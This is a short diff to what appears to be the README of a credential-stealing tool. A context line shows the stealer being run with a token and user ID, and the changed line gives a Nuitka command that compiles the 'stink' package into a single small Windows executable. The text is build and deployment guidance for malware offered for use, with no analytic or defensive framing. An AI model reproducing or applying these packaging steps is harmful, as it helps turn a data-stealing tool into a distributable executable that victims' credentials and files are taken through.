@@ -134,6 +134,6 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 Open a Python terminal. Go to the directory with the project and type the following command (or just open the terminal if you use PyCharm):
 ```python
-nuitka --exe test.py
+nuitka --onefile --include-package=stink test.py
 ```
 After executing the command, we get a test.exe file weighing 234 KB.
